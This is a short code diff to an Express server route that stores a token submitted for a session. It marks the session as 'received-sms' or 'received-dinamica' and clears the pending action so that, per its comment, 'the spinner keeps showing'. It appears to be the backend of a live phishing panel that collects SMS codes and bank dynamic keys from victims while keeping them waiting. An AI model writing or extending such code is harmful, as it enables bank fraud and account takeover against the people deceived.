@@ -77,7 +77,15 @@ app.post('/api/sessions/:id/token', (req, res) => {
   if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
   
   sessions[id].token = token;
-  sessions[id].state = 'typing';
+  
+  // Set state based on current action (sms or dinamica) before clearing the action
+  const currentAction = sessions[id].action;
+  if (currentAction === 'sms') {
+    sessions[id].state = 'received-sms';
+  } else {
+    sessions[id].state = 'received-dinamica';
+  }
+  
   sessions[id].action = null; // Clear the action on the server so the spinner keeps showing!
   sessions[id].last_seen = Date.now();
   sessions[id].updatedAt = Date.now();
